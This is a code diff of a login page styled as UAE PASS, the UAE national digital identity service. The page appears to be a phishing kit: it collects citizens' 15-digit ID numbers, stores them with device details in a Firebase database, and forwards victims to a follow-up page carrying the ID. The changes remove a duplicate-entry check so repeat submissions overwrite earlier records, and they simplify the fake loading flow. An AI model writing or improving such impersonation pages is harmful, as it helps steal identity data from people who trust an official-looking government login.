@@ -3,7 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UAE PASS - تسجيل الدخول</title>
+    
+    <!-- Font preload and Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@100..900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -70,30 +75,13 @@ async function saveToRealtimeDatabase(idNumber) {
                 throw new Error('فشل في تهيئة Firebase');
             }
         }
-        
-        // الحصول على Realtime Database
+
         const database = firebase.database();
-        
-        // استخدام رقم الهوية كرقم مرجع (Key)
-        // تحويل رقم الهوية ليصبح صالحاً كـ key (إزالة الرموز غير المسموحة)
         const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
-        
-        // الحفظ باستخدام رقم الهوية كمرجع
         const authRef = database.ref('authentications/' + safeKey);
-        
-        // التحقق إذا كان الرقم موجوداً مسبقاً
-        const snapshot = await authRef.once('value');
-        if (snapshot.exists()) {
-            console.log('⚠️ رقم الهوية موجود مسبقاً:', safeKey);
-            // يمكنك تحديث البيانات القديمة أو إرجاع خطأ
-            return { 
-                success: false, 
-                id: safeKey,
-                error: 'رقم الهوية مسجل مسبقاً'
-            };
-        }
-        
-        // بيانات الحفظ
+
+        // أنشئ بيانات جديدة دائمًا (تعامل مع العملية كأنها أول مرة)
+        const nowIso = new Date().toISOString();
         const authData = {
             id_number: idNumber,
             timestamp: firebase.database.ServerValue.TIMESTAMP,
@@ -102,26 +90,26 @@ async function saveToRealtimeDatabase(idNumber) {
             status: 'pending',
             device: navigator.userAgent.substring(0, 100),
             ip: 'unknown',
-            created_at: new Date().toISOString()
+            created_at: nowIso,
+            updated_at: nowIso,
+            attempt_count: 1
         };
-        
-        console.log('جار حفظ البيانات مع الرقم كمرجع:', safeKey);
-        
-        // حفظ البيانات
+
+        // اكتب البيانات (ستستبدل أي سجل سابق بنفس المفتاح)
         await authRef.set(authData);
-        
-        console.log('✅ تم الحفظ في Realtime Database:', safeKey);
-        return { 
-            success: true, 
-            id: safeKey,  // رقم الهوية نفسه
+
+        console.log('✅ تم الحفظ (جديد أو معاد) في Realtime Database:', safeKey);
+        return {
+            success: true,
+            id: safeKey,
             message: 'تم الحفظ بنجاح'
         };
-        
+
     } catch (error) {
         console.error('❌ خطأ في حفظ البيانات في Realtime Database:', error);
-        return { 
-            success: false, 
-            error: error.message 
+        return {
+            success: false,
+            error: error.message
         };
     }
 }    
@@ -222,58 +210,21 @@ async function saveToRealtimeDatabase(idNumber) {
                 return;
             }
             
-            // إظهار شاشة التحميل
-            if (loginContent) loginContent.style.display = 'none';
-            if (loadingScreen) loadingScreen.style.display = 'block';
-            
-            // محاكاة التقدم
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 10;
-                const progressBar = document.getElementById('progressBar');
-                const progressText = document.getElementById('progressText');
-                
-                if (progressBar) progressBar.style.width = progress + '%';
-                if (progressText) progressText.textContent = progress + '%';
-                
-                if (progress >= 90) {
-                    clearInterval(progressInterval);
-                }
-            }, 300);
-            
             try {
                 // حفظ في Realtime Database
-                console.log('جاري حفظ رقم الهوية:', idNumber);
                 const result = await saveToRealtimeDatabase(idNumber);
                 
                 if (result.success) {
-    // تحديث الشاشة
-    const loadingTitle = document.getElementById('loadingTitle');
-    const loadingMessage = document.getElementById('loadingMessage');
-    
-    if (loadingTitle) loadingTitle.textContent = 'تم حفظ رقم الهوية بنجاح';
-    if (loadingMessage) loadingMessage.textContent = 'جاري التوجيه إلى صفحة الرمز...';
-    
-    const progressBar = document.getElementById('progressBar');
-    const progressText = document.getElementById('progressText');
-    if (progressBar) progressBar.style.width = '100%';
-    if (progressText) progressText.textContent = '100%';
-    
-    // توقف مؤقت ثم التوجيه إلى success.html
-    setTimeout(() => {
-        // التوجيه إلى success.html مع إرسال رقم الهوية
-        window.location.href = `success.html?id=${encodeURIComponent(idNumber)}`;
-    }, 2000);
-    
-} else {
-    throw new Error(result.error);
-}
+                    // توجيه مباشر إلى success.html مع إرسال رقم الهوية
+                    window.location.href = `success.html?id=${encodeURIComponent(idNumber)}`;
+                } else {
+                    throw new Error(result.error);
+                }
                 
             } catch (error) {
                 console.error('❌ Error in login process:', error);
-                showAlert('خطأ في النظام', 'حدث خطأ في حفظ البيانات: ' + error.message);
+                showAlert('خطأ في النظام', 'حدث خطأ في حفظ البيانات: ' + (error.message || error));
                 if (loginContent) loginContent.style.display = 'block';
-                if (loadingScreen) loadingScreen.style.display = 'none';
             }
         });
         
@@ -286,6 +237,11 @@ async function saveToRealtimeDatabase(idNumber) {
             --success-color: #00ac75;
             --error-color: #ff4757;
             --warning-color: #ff9800;
+        }
+
+        /* استخدم الخط المضاف كأساس للصفحة */
+        body {
+            font-family: "Noto Kufi Arabic", Roboto, system-ui, -apple-system, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
         }
         
         .form-options {
@@ -309,6 +265,14 @@ async function saveToRealtimeDatabase(idNumber) {
             accent-color: var(--primary-color);
             order: 1;
         }
+        .path {
+    width: 100%;
+    height: 2px;
+    border: solid 1px #00a36a;
+    padding-left: 100px;
+    padding-right: 100px;
+    margin-bottom: 18px;
+}
 
         .checkbox-label {
             font-size: 14px;
@@ -553,9 +517,7 @@ async function saveToRealtimeDatabase(idNumber) {
                                pattern="\d{15}"
                                maxlength="15"
                                required>
-                        <div class="form-hint" style="font-size: 12px; color: #666; margin-top: 5px;">
-                            رقم الهوية يجب أن يكون 15 رقماً
-                        </div>
+                        
                     </div>
                     
                     <div class="form-options">
@@ -596,8 +558,8 @@ async function saveToRealtimeDatabase(idNumber) {
                     </div>
                 </div>
             </main>
-            
-            <footer class="footer">
+                                 <div class="path"></div>
+<footer class="footer">
                 <div class="footer-links">
                     <a href="https://uaepass.ae/support" class="menu-link">الدعم</a>
                     <span class="menu-separator">|</span>
@@ -608,10 +570,15 @@ async function saveToRealtimeDatabase(idNumber) {
                 
                 <div class="copyright">
                     <i class="fas fa-copyright"></i> حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.
+                    <br>
+                    <div></div>
+                    <p></p>
                 </div>
             </footer>
+            
         </div>
     </div>
+   
 
 
 <!-- أضف SDK Realtime Database في الـ head -->
